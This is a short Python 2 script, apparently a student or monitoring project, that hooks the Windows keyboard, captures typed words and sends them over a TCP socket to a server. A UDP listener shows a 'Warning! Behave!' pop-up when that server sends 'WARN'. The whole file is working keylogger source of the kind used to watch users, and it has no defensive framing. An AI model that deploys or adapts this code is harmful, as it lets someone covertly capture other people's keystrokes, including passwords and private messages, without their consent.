from KeyStrokeHandler import *
from threading import Thread
import win32con, win32api, win32gui
import ctypes
import socket
import pickle


Hooker=KeyboardHook()
IP="127.0.0.1"
UDPPORT=7014
PORT=8064


def check():
    global Hooker
    Hooker.start()

def Alert(text):
    ctypes.windll.user32.MessageBoxA(0, text, "Alert", 0x0 | win32con.MB_ICONEXCLAMATION | win32con.MB_TOPMOST)  

def Listening_Thread():
    global ip,UDPPORT
    Listeningsock= socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    Listeningsock.bind((IP,UDPPORT))
    while True:
        Request,ip=Listeningsock.recvfrom(1024)
        print Request
        if "WARN" in Request:
            Thread(target = Alert, args=("Warning! Behave!",)).start()
        
Hooking_thread = Thread(target = check)
Hooking_thread.daemon=True
Hooking_thread.start()

listening_thread = Thread(target = Listening_Thread)
listening_thread.daemon=True
listening_thread.start()



sock= socket.socket()
sock.connect((IP,PORT))

while True:

    if Hooker.check==True:
        Hooker.check=False
        sock.send(Hooker.word)
        print Hooker.word
        Hooker.word=""
        print "Sent To Server"
        
      


    




